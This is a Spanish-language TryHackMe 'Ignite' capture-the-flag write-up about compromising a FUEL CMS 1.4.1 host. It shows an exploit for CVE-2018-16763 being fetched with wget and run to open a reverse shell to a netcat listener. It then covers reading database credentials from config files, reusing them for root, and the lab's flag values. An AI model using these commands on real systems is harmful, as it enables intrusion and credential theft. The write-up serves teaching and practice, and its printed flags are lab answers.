[Ignite](https://tryhackme.com/room/ignite)
# TryHackMe — Ignite 

## 1. Fase de Reconocimiento

Comencé realizando un escaneo de los servicios:

```bash
nmap -sCV 10.67.182.18 --open
```

### Parámetros utilizados

- `-sC`: ejecuta los scripts básicos de enumeración de Nmap.
- `-sV`: identifica las versiones de los servicios.
- `--open`: muestra únicamente los puertos abiertos.

El resultado mostró:

```text
80/tcp open http Apache httpd 2.4.18 ((Ubuntu))
```

Nmap también encontró una entrada en `robots.txt`:

```text
http-robots.txt: 1 disallowed entry
_/fuel/
```

Además, identificó que el servidor estaba ejecutando FUEL CMS.

## 2. Enumeración de `robots.txt`

Revisé:

```text
http://10.67.182.18/robots.txt
```

Encontré:

```text
User-agent: *
Disallow: /fuel/
To access the FUEL admin, go to:
http://10.67.182.18/fuel
User name: admin
Password: admin
```

Con estas credenciales accedí al panel de administración de FUEL:

```text
http://10.67.182.18/fuel/login/5a6e566c6243396b59584e6f596d3968636d513d
```

Utilicé:

```text
Username: admin
Password: admin
```

## 3. Búsqueda de vulnerabilidades

Como no conocía mucho sobre FUEL CMS, utilicé `searchsploit` para buscar vulnerabilidades relacionadas con la versión:

```bash
searchsploit fuel 1.4
```

Encontré varios resultados de Remote Code Execution:

```text
fuel CMS 1.4.1 - Remote Code Execution (1) | linux/webapps/47138.py
Fuel CMS 1.4.1 - Remote Code Execution (2) | php/webapps/49487.rb
Fuel CMS 1.4.1 - Remote Code Execution (3) | php/webapps/50477.py
```

También aparecieron vulnerabilidades de SQL Injection:

```text
Fuel CMS 1.4.13 - 'col' Blind SQL Injection (Authenticated)
Fuel CMS 1.4.7 - 'col' SQL Injection (Authenticated)
Fuel CMS 1.4.8 - 'fuel_replace_id' SQL Injection (Authenticated)
```

Me centré en:

```text
fuel CMS 1.4.1 - Remote Code Execution
```

La vulnerabilidad utilizada corresponde a:

```text
CVE-2018-16763
```

Encontré un repositorio con una versión actualizada del exploit:

```text
https://github.com/ice-wzl/Fuel-1.4.1-RCE-Updated
```

Descargué el script:

```bash
wget https://raw.githubusercontent.com/ice-wzl/Fuel-1.4.1-RCE-Updated/refs/heads/main/Fuel-Updated.py
```

El script permite utilizar Python 3 y generar una reverse shell.

## 4. Preparación de la Reverse Shell

Primero puse mi máquina en escucha:

```bash
nc -nlvp 4444
```

### Parámetros utilizados

- `-n`: evita resolver nombres DNS.
- `-l`: coloca Netcat en modo escucha.
- `-v`: muestra información detallada de la conexión.
- `-p 4444`: utiliza el puerto `4444`.

El resultado fue:

```text
Listening on 0.0.0.0 4444
```

Después ejecuté el exploit indicando la URL del objetivo, mi IP y el puerto de escucha:

```bash
python3 Fuel-Updated.py http://10.65.172.39 192.168.128.13 4444
```

### Parámetros utilizados

- `python3`: ejecuta el script con Python 3.
- `Fuel-Updated.py`: exploit utilizado.
- `http://10.65.172.39`: URL del objetivo.
- `192.168.128.13`: IP de mi máquina para recibir la conexión.
- `4444`: puerto donde estaba escuchando Netcat.

Recibí la conexión:

```text
Connection received on 10.65.172.39 42014
sh: 0: can't access tty; job control turned off
$
```

Comprobé el usuario actual:

```bash
whoami
```

Resultado:

```text
www-data
```

## 5. Obtención de la User Flag

Desde la shell revisé `/home`:

```bash
cd /home
ls -l
```

Encontré:

```text
drwx--x--x 2 www-data www-data 4096 Jul 26 2019 www-data
```

Entré al directorio:

```bash
cd www-data
ls -l
```

Encontré:

```text
-rw-r--r-- 1 root root 34 Jul 26 2019 flag.txt
```

Leí el archivo:

```bash
cat flag.txt
```

Obtuve:

```text
6470e394cbf6dab6a91682cc8585059b
```

## 6. Obtener una Shell Interactiva

La reverse shell inicial era limitada, así que intenté mejorarla utilizando Python:

```bash
python3 -c 'import pty:pty.spawn("/bin/bash")'
```

El primer intento produjo:

```text
SyntaxError: invalid syntax
```

Corregí el comando:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Con esto obtuve una shell más interactiva:

```text
www-data@ubuntu:/var/www/html$
```

## 7. Enumeración de FUEL CMS

Desde `/var/www/html` revisé el contenido:

```bash
ls
```

Encontré:

```text
README.md
assets
composer.json
contributing.md
fuel
index.php
robots.txt
```

Entré en `fuel`:

```bash
cd fuel
ls
```

Encontré:

```text
application
data_backup
install
modules
codeigniter
index.php
licenses
scripts
```

Después entré en `application`:

```bash
cd application
ls
```

Encontré:

```text
cache
controllers
helpers
index.html
libraries
migrations
third_party
config
core
hooks
language
logs
models
views
```

Entré en el directorio de configuración:

```bash
cd config
ls
```

Entre los archivos disponibles estaba:

```text
database.php
```

## 8. Obtención de Credenciales

Leí el archivo:

```bash
cat database.php
```

Encontré la configuración:

```text
hostname: localhost
username: root
password: mememe
database: fuel_schema
dbdriver: mysqli
```

Las credenciales encontradas fueron:

```text
Usuario: root
Contraseña: mememe
```

Con estas credenciales intenté cambiar al usuario `root`.

## 9. Escalada de Privilegios

Ejecuté:

```bash
su root
```

El sistema solicitó la contraseña:

```text
Password:
```

Introduje:

```text
mememe
```

El cambio de usuario fue exitoso:

```text
root@ubuntu:/var/www/html/fuel/application/config#
```

Comprobé el contenido de `/root`:

```bash
cd /root
ls
```

Encontré:

```text
root.txt
```

Finalmente leí la flag:

```bash
cat root.txt
```

Obtuve:

```text
b9bbcb33e11b80be759c4e844862482d
```

## Cadena de ataque

```text
Nmap
  │
  └── Puerto 80
         │
         └── robots.txt
                │
                ├── /fuel/
                └── admin : admin
                       │
                       └── FUEL CMS 1.4.1
                              │
                              └── Searchsploit
                                     │
                                     └── CVE-2018-16763
                                            │
                                            └── Remote Code Execution
                                                   │
                                                   └── Reverse Shell
                                                          │
                                                          └── www-data
                                                                 │
                                                                 ├── user flag
                                                                 │
                                                                 └── database.php
                                                                        │
                                                                        └── root : mememe
                                                                               │
                                                                               └── su root
                                                                                      │
                                                                                      └── root flag
```
